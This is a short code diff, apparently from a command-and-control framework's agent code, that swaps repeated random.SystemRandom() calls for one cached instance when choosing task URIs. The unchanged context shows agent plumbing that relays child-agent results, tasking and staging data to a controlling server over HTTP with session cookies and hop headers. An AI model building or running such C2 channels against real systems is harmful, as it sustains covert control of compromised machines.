@@ -1063,6 +1063,8 @@ import urllib
 import random
 import sys
 
+_sysrand = random.SystemRandom()
+
 
 class ExtendedPacketHandler(PacketHandler):
     def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
@@ -1076,20 +1078,20 @@ class ExtendedPacketHandler(PacketHandler):
 
     def send_results_for_child(self, received_data):
         self.headers['Cookie'] = "session=%s" % (received_data[1:])
-        taskUri = random.SystemRandom().choice({profile.post.client.uris!s})
+        taskUri = _sysrand.choice({profile.post.client.uris!s})
         requestUri = self.server + taskUri
         response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
         return response
 
     def send_get_tasking_for_child(self, received_data):
         decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
-        taskUri = random.SystemRandom().choice({profile.post.client.uris!s})
+        taskUri = _sysrand.choice({profile.post.client.uris!s})
         requestUri = self.server + taskUri
         response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
         return response
 
     def send_staging_for_child(self, received_data, hop_name):
-        postURI = self.server + random.SystemRandom().choice({profile.post.client.uris!s})
+        postURI = self.server + _sysrand.choice({profile.post.client.uris!s})
         self.headers['Hop-Name'] = hop_name
         decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
         response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
@@ -1120,7 +1122,7 @@ class ExtendedPacketHandler(PacketHandler):
 
             # ==== CHOOSE URI ====
             sendMessage += (
-                "            taskUri = random.SystemRandom().choice("
+                "            taskUri = _sysrand.choice("
                 + str(profile.post.client.uris)
                 + ")\n"
             )
@@ -1195,7 +1197,7 @@ class ExtendedPacketHandler(PacketHandler):
 
             # ==== CHOOSE URI ====
             sendMessage += (
-                "            taskUri = random.SystemRandom().choice("
+                "            taskUri = _sysrand.choice("
                 + str(profile.get.client.uris)
                 + ")\n"
             )
